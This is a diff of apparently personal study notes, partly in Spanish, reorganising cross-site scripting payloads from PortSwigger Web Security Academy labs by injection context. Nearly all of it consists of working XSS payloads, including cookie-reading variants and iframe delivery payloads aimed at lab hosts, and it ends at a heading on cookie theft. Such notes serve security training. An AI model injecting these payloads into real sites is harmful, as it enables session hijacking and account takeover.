@@ -2,124 +2,80 @@ PortSwigger cheat sheet:
 https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
 
 ---------------------------------------------------------
+# 1. BASIC INJECTIONS & HTML CONTEXT
 
-Metodologia de Campos:
-```
-# Probar con <script>alert("");</script> en todos los campos con distintos comentarios para ver cual de todos es el vulnerable
-```
-
-```
-==> DOM:
+-- **_Basic Field Testing (Find vulnerable parameter)_**
+```html
 "><script>alert(0)</script>
 ```
-![[Pasted image 20260621130559.png]]
 
-InnerHTML:
-```
-<img src=0 onerror=alert(0)>
-```
-
-'href' con jQuery:
-```
-returnPath=javascript:alert(document.cookie);
+-- **_InnerHTML / Standard Tag Injection_**
+```html
+<img src=x onerror=alert(0)>
 ```
 
-'iframe' (jQeury con 'hashChange'):
-Send TO victim Payloads!!!:
-```
-<iframe src="https://0a1e0035041ccbea8470d6b6006c002e.web-security-academy.net/#" onload="this.src += '<img src=0 onerror=print()>'"></iframe>
-```
-
-Menor/Mayor HTML Encodeados con &gt y &lt:
-```
-"onmouseover="alert(0)
+-- **_Break out of <select> / <option> (document.write)_**
+```html
+</option></select><script>alert(0)</script>
 ```
 
-Double Quotes HTML Encodeadas:
-```
-javascript:alert(0)
-```
-
-Angle Brackets HTML Encodeadas:
-```
-test'; alert(0); var test='prueba
-```
-
-'Select' con 'document.write':
-```
-?productId=2&storeId=</option></select><script>alert(0)</script>
-```
-
-AngularJS siempre comienza con `<body ng-app>`:
-```
---> Usar 'payloadallthethings xss':
-{{constructor.constructor('alert(1)')()}}
-```
-
-Reflected DOM XSS:
-```
---> Teniamos la funcion 'eval()' de JS:
-probando \"*alert(0)}//
-```
-
-Stored DOM XSS:
-```
---> Se aplica sanitizacion con 'replace()', al cambiar solo la primera aparicion podemos hacer algo asi:
-<><img src=FuckYou onerror=alert(0)>
-```
-
-Reflected XSS con etiquetas bloqueadas:
-```
---> Usando intruder y el cheatsheet vemos que la etiqueta que no esta bloqueada es '<body>' y que uno de los eventos no bloqueados es 'onresize', asi que armamos este payload con iframe:
-
-<iframe src="https://0a4400c604f6f9df8147c6670075009d.web-security-academy.net/?search=<body onresize=print()>" onload=this.style.width='100px'></iframe>
-```
-
-Custom HTML-Tags (todas las demas blocked):
-```
---> tabindex es necesario con onfocus, para que pueda focusearse en ese elemento. Asi como el # sirve para ir al elemento que tiene el id=identificador una vez cargue la pagina:
-
-<script>
-location= 'https://0afa007304538a0980bf3a0d005e00cc.web-security-academy.net/?search=<etiqueta id=identificador onfocus=alert(document.cookie) tabindex=1>#identificador';
-</script>
-
-<test onfocus=alert(document.cookie) tabindex=1 autofocus>
-```
-
-Etiquetas SVG:
-- Se hace lo de siempre, buscar con intruder las etiquetas con codigo 200 y luego probar con los eventos (ambos del cheatsheet):
-```
-<svg><animateTransform onbegin=alert(0)>
-```
-
-Etiqueta 'canonical':
-```
-'accesskey='x'onclick='alert(0)
-```
-
-```
+-- **_Break out of existing <script> tags_**
+```html
 </script><script>alert(0)</script>
 ```
 
+---
+# 2. ATTRIBUTE CONTEXT
+
+-- **_Angle Brackets (< >) HTML Encoded_**
+```html
+" onmouseover="alert(0)
 ```
+
+-- **_Double Quotes HTML Encoded (href, src, action sinks)_**
+```javascript
+javascript:alert(document.cookie)
+```
+
+-- **_Link tag (canonical) / Hidden attributes (Accesskey)_**
+```html
+' accesskey='x' onclick='alert(0)
+```
+
+---
+
+# 3. JAVASCRIPT CONTEXT
+
+-- **_Break out of JS String (When < > are HTML encoded)_**
+```javascript
+test'; alert(0); var test='
+```
+
+-- **_Escape sequence bypass (Break out of escaped strings)_**
+```javascript
 test\'+alert(0);//
 ```
 
-Con todos los caracteres escapados:
-- Se pueden buscar formas de representar los simbolos con este quotation:
-	- La comilla simple " ' " se representa como '&apos;'
-```
-&apos;+alert(0)+&apos;
-```
-
-Con caracteres Unicode escapados:
-- Con 'backticks' se puede hacer referencia al valor de una variable de la forma ${variable} ademas de interpretar todo el codigo que haya dentro
-```
+-- **_Template Literals / Backticks (When Unicode is escaped)_**
+```javascript
 ${alert(0)}
 ```
 
+-- **_HTML Entities inside JS Strings (Using quotes)_**
+```javascript
+&apos;+alert(0)+&apos;
+```
 
-...
+-- **_eval() Context Bypass_**
+```javascript
+\"*alert(0)}//
+```
+
+---
+
+
+
+---
 
 
 Robo de cookies por XSS:
